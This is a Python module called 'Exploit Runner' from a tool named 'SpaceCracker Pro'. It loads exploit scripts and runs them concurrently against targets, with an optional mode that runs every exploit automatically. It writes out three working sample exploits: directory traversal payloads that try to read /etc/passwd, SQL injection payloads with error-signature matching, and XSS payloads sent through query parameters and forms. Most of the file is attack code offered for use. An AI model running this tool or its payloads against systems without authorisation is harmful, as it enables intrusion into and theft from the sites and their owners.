#!/usr/bin/env python3
"""
SpaceCracker Pro - Exploit Runner Module
Automatic exploit execution for discovered vulnerabilities
"""

import asyncio
import aiohttp
import json
import logging
import os
import time
from pathlib import Path
from typing import Dict, Any, List, Optional, Callable
from urllib.parse import urljoin, urlparse
import importlib.util
import inspect
from dataclasses import dataclass
from ..utils.http import create_session
from .base import BaseModule

@dataclass
class ExploitResult:
    """Result of an exploit execution"""
    exploit_name: str
    target: str
    success: bool
    severity: str
    extracted_data: Dict[str, Any]
    error: Optional[str] = None
    execution_time: float = 0.0

class ExploitRunner(BaseModule):
    """Advanced exploit runner with auto-execution capabilities"""
    
    module_id = "exploit_runner"
    name = "Exploit Runner"
    description = "Automatic exploit execution for discovered vulnerabilities"
    supports_batch = True
    
    def __init__(self, config: Any = None):
        super().__init__(config)
        self.logger = logging.getLogger(__name__)
        self.exploits = {}
        self.exploit_dir = Path("exploits")
        self.auto_execute = getattr(config, 'auto_execute', False) if config else False
        self.max_concurrent_exploits = getattr(config, 'max_concurrent_exploits', 10) if config else 10
        self._load_exploits()
    
    def _load_exploits(self):
        """Load exploit modules from the exploits directory"""
        if not self.exploit_dir.exists():
            self.exploit_dir.mkdir(parents=True, exist_ok=True)
            self._create_sample_exploits()
        
        for exploit_file in self.exploit_dir.glob("*.py"):
            try:
                exploit_name = exploit_file.stem
                spec = importlib.util.spec_from_file_location(exploit_name, exploit_file)
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                
                # Look for exploit class or function
                exploit_func = None
                if hasattr(module, 'exploit'):
                    exploit_func = module.exploit
                elif hasattr(module, 'run_exploit'):
                    exploit_func = module.run_exploit
                else:
                    # Look for any function that looks like an exploit
                    for name, obj in inspect.getmembers(module):
                        if callable(obj) and name.lower().startswith(('exploit', 'check', 'test')):
                            exploit_func = obj
                            break
                
                if exploit_func:
                    self.exploits[exploit_name] = {
                        'function': exploit_func,
                        'module': module,
                        'metadata': getattr(module, 'EXPLOIT_METADATA', {
                            'name': exploit_name,
                            'description': f'Exploit module {exploit_name}',
                            'severity': 'Medium',
                            'cve': None,
                            'targets': [],
                            'safe': True
                        })
                    }
                    self.logger.info(f"Loaded exploit: {exploit_name}")
                
            except Exception as e:
                self.logger.warning(f"Failed to load exploit {exploit_file}: {e}")
    
    def _create_sample_exploits(self):
        """Create sample exploit modules for demonstration"""
        
        # Directory traversal exploit
        dir_traversal_content = '''#!/usr/bin/env python3
"""
Directory Traversal Exploit
Tests for path traversal vulnerabilities
"""

import aiohttp
from urllib.parse import urljoin

EXPLOIT_METADATA = {
    'name': 'Directory Traversal',
    'description': 'Tests for directory traversal vulnerabilities',
    'severity': 'High',
    'cve': 'CVE-GENERIC-TRAVERSAL',
    'targets': ['web'],
    'safe': True
}

async def exploit(session, target_url, context=None):
    """Test for directory traversal vulnerability"""
    payloads = [
        '../../../etc/passwd',
        '..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%etc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
    ]
    
    results = {
        'vulnerable': False,
        'payloads_tested': len(payloads),
        'successful_payloads': [],
        'evidence': []
    }
    
    for payload in payloads:
        try:
            test_url = urljoin(target_url, payload)
            async with session.get(test_url, timeout=10) as response:
                content = await response.text()
                
                # Check for Unix passwd file content
                if 'root:' in content and '/bin/' in content:
                    results['vulnerable'] = True
                    results['successful_payloads'].append(payload)
                    results['evidence'].append(f'Unix passwd file leaked via: {payload}')
                
                # Check for Windows hosts file
                elif 'localhost' in content and '127.0.0.1' in content:
                    results['vulnerable'] = True
                    results['successful_payloads'].append(payload)
                    results['evidence'].append(f'Windows hosts file leaked via: {payload}')
                    
        except Exception as e:
            continue
    
    return results
'''
        
        # SQL Injection exploit
        sql_injection_content = '''#!/usr/bin/env python3
"""
SQL Injection Exploit
Tests for SQL injection vulnerabilities
"""

import aiohttp
from urllib.parse import urljoin, urlparse, parse_qs

EXPLOIT_METADATA = {
    'name': 'SQL Injection Scanner',
    'description': 'Tests for SQL injection vulnerabilities',
    'severity': 'Critical',
    'cve': 'CVE-GENERIC-SQLI',
    'targets': ['web', 'api'],
    'safe': True
}

async def exploit(session, target_url, context=None):
    """Test for SQL injection vulnerability"""
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        '" OR 1=1--',
        "' UNION SELECT NULL--",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--"
    ]
    
    sql_errors = [
        'mysql_fetch_array',
        'ORA-01756',
        'Microsoft OLE DB Provider for ODBC Drivers',
        'PostgreSQL query failed',
        'SQLite/JDBCDriver',
        'SQLServer JDBC Driver',
        'MySQL server version',
        'syntax error near'
    ]
    
    results = {
        'vulnerable': False,
        'payloads_tested': len(payloads),
        'error_based': False,
        'blind_sqli': False,
        'evidence': [],
        'database_type': None
    }
    
    # Test different injection points
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query) if parsed_url.query else {}
    
    # Test query parameters
    for param in query_params.keys():
        for payload in payloads:
            try:
                test_params = query_params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                
                async with session.get(test_url, params=test_params, timeout=10) as response:
                    content = await response.text()
                    
                    # Check for SQL errors
                    for error in sql_errors:
                        if error.lower() in content.lower():
                            results['vulnerable'] = True
                            results['error_based'] = True
                            results['evidence'].append(f'SQL error found with payload: {payload}')
                            
                            if 'mysql' in error.lower():
                                results['database_type'] = 'MySQL'
                            elif 'postgresql' in error.lower():
                                results['database_type'] = 'PostgreSQL'
                            elif 'oracle' in error.lower():
                                results['database_type'] = 'Oracle'
                            elif 'sqlite' in error.lower():
                                results['database_type'] = 'SQLite'
                            break
                    
                    # Check for time-based blind SQLi indicators
                    if response.headers.get('X-Response-Time'):
                        response_time = float(response.headers.get('X-Response-Time', 0))
                        if response_time > 5:  # Potential time-based SQLi
                            results['vulnerable'] = True
                            results['blind_sqli'] = True
                            results['evidence'].append(f'Potential time-based SQLi: {payload}')
                            
            except Exception as e:
                continue
    
    return results
'''
        
        # XSS exploit
        xss_content = '''#!/usr/bin/env python3
"""
Cross-Site Scripting (XSS) Exploit
Tests for XSS vulnerabilities
"""

import aiohttp
from urllib.parse import urljoin, urlparse, parse_qs

EXPLOIT_METADATA = {
    'name': 'XSS Scanner',
    'description': 'Tests for Cross-Site Scripting vulnerabilities',
    'severity': 'High',
    'cve': 'CVE-GENERIC-XSS',
    'targets': ['web'],
    'safe': True
}

async def exploit(session, target_url, context=None):
    """Test for XSS vulnerability"""
    payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\\'XSS\\')">',
        '<body onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        "' onmouseover='alert(\\"XSS\\")'"
    ]
    
    results = {
        'vulnerable': False,
        'payloads_tested': len(payloads),
        'reflected_xss': False,
        'stored_xss': False,
        'evidence': []
    }
    
    # Test different injection points
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query) if parsed_url.query else {}
    
    # Test query parameters for reflected XSS
    for param in query_params.keys():
        for payload in payloads:
            try:
                test_params = query_params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                
                async with session.get(test_url, params=test_params, timeout=10) as response:
                    content = await response.text()
                    
                    # Check if payload is reflected in response
                    if payload in content:
                        results['vulnerable'] = True
                        results['reflected_xss'] = True
                        results['evidence'].append(f'Reflected XSS found with payload: {payload}')
                        break
                        
            except Exception as e:
                continue
    
    # Test POST forms for XSS
    try:
        async with session.get(target_url, timeout=10) as response:
            content = await response.text()
            
            # Simple form detection
            if '<form' in content.lower() and 'input' in content.lower():
                for payload in payloads[:3]:  # Test fewer payloads for POST
                    try:
                        form_data = {'input': payload, 'search': payload, 'query': payload}
                        async with session.post(target_url, data=form_data, timeout=10) as post_response:
                            post_content = await post_response.text()
                            
                            if payload in post_content:
                                results['vulnerable'] = True
                                results['reflected_xss'] = True
                                results['evidence'].append(f'POST XSS found with payload: {payload}')
                                break
                                
                    except Exception as e:
                        continue
                        
    except Exception as e:
        pass
    
    return results
'''
        
        # Write sample exploits
        sample_exploits = [
            ('directory_traversal.py', dir_traversal_content),
            ('sql_injection.py', sql_injection_content),
            ('xss_scanner.py', xss_content)
        ]
        
        for filename, content in sample_exploits:
            exploit_path = self.exploit_dir / filename
            if not exploit_path.exists():
                try:
                    with open(exploit_path, 'w') as f:
                        f.write(content)
                    self.logger.info(f"Created sample exploit: {filename}")
                except Exception as e:
                    self.logger.warning(f"Failed to create sample exploit {filename}: {e}")
    
    async def run(self, target: str, config: Any, context: Dict[str, Any]) -> Dict[str, Any]:
        """Run exploit runner against target"""
        findings = []
        errors = []
        
        try:
            # Determine which exploits to run based on context
            relevant_exploits = self._select_exploits(target, context)
            
            if not relevant_exploits and not self.auto_execute:
                return {
                    "module": self.module_id,
                    "target": target,
                    "findings": [],
                    "errors": ["No exploits selected for execution"],
                    "message": "Use auto_execute=True to run all exploits or provide context"
                }
            
            async with create_session() as session:
                # Execute exploits with concurrency control
                semaphore = asyncio.Semaphore(self.max_concurrent_exploits)
                
                tasks = []
                for exploit_name in relevant_exploits:
                    task = self._run_exploit(session, semaphore, exploit_name, target, context)
                    tasks.append(task)
                
                # Execute all exploits
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Process results
                for result in results:
                    if isinstance(result, Exception):
                        errors.append(f"Exploit execution error: {result}")
                    elif result and result.success:
                        findings.append({
                            'type': 'Exploit Success',
                            'severity': result.severity,
                            'exploit_name': result.exploit_name,
                            'target': result.target,
                            'execution_time': result.execution_time,
                            'extracted_data': result.extracted_data,
                            'description': f"Exploit '{result.exploit_name}' executed successfully"
                        })
        
        except Exception as e:
            self.logger.error(f"Exploit runner error for {target}: {e}")
            errors.append(str(e))
        
        return {
            "module": self.module_id,
            "target": target,
            "findings": findings,
            "errors": errors
        }
    
    def _select_exploits(self, target: str, context: Dict[str, Any]) -> List[str]:
        """Select relevant exploits based on target and context"""
        relevant_exploits = []
        
        if self.auto_execute:
            # Run all safe exploits
            for exploit_name, exploit_data in self.exploits.items():
                if exploit_data['metadata'].get('safe', True):
                    relevant_exploits.append(exploit_name)
        else:
            # Select exploits based on context (previous findings)
            target_type = self._identify_target_type(target, context)
            
            for exploit_name, exploit_data in self.exploits.items():
                exploit_targets = exploit_data['metadata'].get('targets', [])
                if target_type in exploit_targets or 'all' in exploit_targets:
                    relevant_exploits.append(exploit_name)
        
        return relevant_exploits
    
    def _identify_target_type(self, target: str, context: Dict[str, Any]) -> str:
        """Identify target type based on previous scan results"""
        # Check context for clues about target type
        if context:
            findings = context.get('findings', [])
            
            for finding in findings:
                finding_type = finding.get('type', '').lower()
                content_analysis = finding.get('content_analysis', {})
                
                # Check for web application indicators
                if 'web' in finding_type or 'http' in finding_type:
                    return 'web'
                
                # Check for API indicators
                if 'api' in finding_type or finding.get('path', '').startswith('/api/'):
                    return 'api'
                
                # Check for admin panel indicators
                if content_analysis.get('pattern_matches', {}).get('admin_panel'):
                    return 'admin'
                
                # Check for database indicators
                if content_analysis.get('pattern_matches', {}).get('database_info'):
                    return 'database'
        
        # Default to web if no specific type identified
        return 'web'
    
    async def _run_exploit(self, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore,
                          exploit_name: str, target: str, context: Dict[str, Any]) -> Optional[ExploitResult]:
        """Run a single exploit"""
        async with semaphore:
            start_time = time.time()
            
            try:
                exploit_data = self.exploits[exploit_name]
                exploit_func = exploit_data['function']
                metadata = exploit_data['metadata']
                
                # Execute the exploit
                result_data = await exploit_func(session, target, context)
                
                execution_time = time.time() - start_time
                
                # Determine if exploit was successful
                success = False
                if isinstance(result_data, dict):
                    success = result_data.get('vulnerable', False) or result_data.get('success', False)
                elif isinstance(result_data, bool):
                    success = result_data
                    result_data = {'success': success}
                
                return ExploitResult(
                    exploit_name=exploit_name,
                    target=target,
                    success=success,
                    severity=metadata.get('severity', 'Medium'),
                    extracted_data=result_data if isinstance(result_data, dict) else {},
                    execution_time=execution_time
                )
                
            except Exception as e:
                execution_time = time.time() - start_time
                self.logger.error(f"Error running exploit {exploit_name} on {target}: {e}")
                
                return ExploitResult(
                    exploit_name=exploit_name,
                    target=target,
                    success=False,
                    severity='Low',
                    extracted_data={},
                    error=str(e),
                    execution_time=execution_time
                )
    
    def list_exploits(self) -> Dict[str, Dict[str, Any]]:
        """List all loaded exploits with their metadata"""
        return {name: data['metadata'] for name, data in self.exploits.items()}
    
    def get_exploit_info(self, exploit_name: str) -> Optional[Dict[str, Any]]:
        """Get information about a specific exploit"""
        if exploit_name in self.exploits:
            return self.exploits[exploit_name]['metadata']
        return None